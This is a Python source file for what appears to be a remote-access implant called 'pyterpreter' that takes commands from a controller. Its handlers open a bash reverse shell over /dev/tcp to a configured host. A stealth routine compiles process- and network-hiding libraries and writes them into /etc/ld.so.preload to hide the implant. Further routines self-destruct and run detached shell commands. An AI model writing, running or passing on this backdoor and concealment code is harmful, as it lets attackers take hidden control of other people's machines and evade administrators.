import os
import subprocess
import tempfile
from typing import Any

from core.message import *

from pyterpreter import config
from pyterpreter import util


def process_requests_forever():
    while True:
        request = config.messages_received.get()  # type: Any
        message_class = request.__class__.__name__
        handle_func = globals().get(f'_handle_{message_class}')
        if handle_func is not None and inspect.isfunction(handle_func):
            handle_func(request)

        else:
            print(f'Could not find handle_func for {request.encode()}')


def _handle_PingRequest(request: PingRequest):
    config.messages_to_send.put(PingResponse(request_id=request.request_id))


def _handle_OpenReverseShellRequest(request: OpenReverseShellRequest):
    _run_command_detached(f"/bin/bash -c 'bash -i >& /dev/tcp/{config.LOCAL_IP}/{request.port} 0>&1'")


# TODO
def _do_stealth():
    has_gcc_code = util.process_get_cmd_output('gcc --version')[0]
    network_hider_filename = '/usr/local/lib/libld.so'
    process_hider_filename = '/usr/local/lib/libc.so'
    if not os.path.isdir(os.path.dirname(network_hider_filename)):
        network_hider_filename = tempfile.mkstemp()[1]
    if not os.path.isdir(os.path.dirname(process_hider_filename)):
        process_hider_filename = tempfile.mkstemp()[1]

    if has_gcc_code == 0:
        print('Building stealth exploits from source')
        network_hider_source_fd, network_hider_source_filename = tempfile.mkstemp(suffix='.c')
        process_hider_source_fd, process_hider_source_filename = tempfile.mkstemp(suffix='.c')
        network_hider_source = util.resource_get('stealth_network_hider.c')
        process_hider_source = util.resource_get('stealth_process_hider.c')
        os.write(network_hider_source_fd, network_hider_source)
        os.write(process_hider_source_fd, process_hider_source)
        os.close(network_hider_source_fd)
        os.close(process_hider_source_fd)

        assert 0 == util.process_get_cmd_output(f'gcc -fPIC -shared -o {network_hider_filename} {network_hider_source_filename} -ldl')[0], 'Building network hider failed'
        assert 0 == util.process_get_cmd_output(f'gcc -fPIC -shared -o {process_hider_filename} {process_hider_source_filename} -ldl')[0], 'Building process hider failed'

        os.unlink(network_hider_source_filename)
        os.unlink(process_hider_source_filename)

    else:
        raise Exception('gcc is not installed')
        # log('gcc not installed so using prebuilt libraries')
        # with open(network_hider_filename, 'wb+') as fh:
        #     fh.write(MessageProcessor.get_resource('stealth', 'network_hider.so'))
        #     fh.truncate()
        # with open(process_hider_filename, 'wb+') as fh:
        #     fh.write(MessageProcessor.get_resource('stealth', 'process_hider.so'))

    with open('/etc/ld.so.preload', 'w+') as fh:
        fh.write(f'{network_hider_filename}\n{process_hider_filename}\n')
        fh.truncate()

    print(f'Stealth injection successful, current process PID is {os.getpid()}')


def _do_self_destruct():
    print('Self destructing')
    config.self_destructing = True
    if config.pacemaker_pid is not None:
        os.system(f'kill -9 {config.pacemaker_pid}')
    exit(0)


def _run_command_detached(command: str):
    print(f'Running detached: "{command}"')
    proc = subprocess.Popen('/bin/sh', stdin=subprocess.PIPE)
    proc.stdin.write(f'{command} &\nexit\n'.encode())
    proc.communicate()
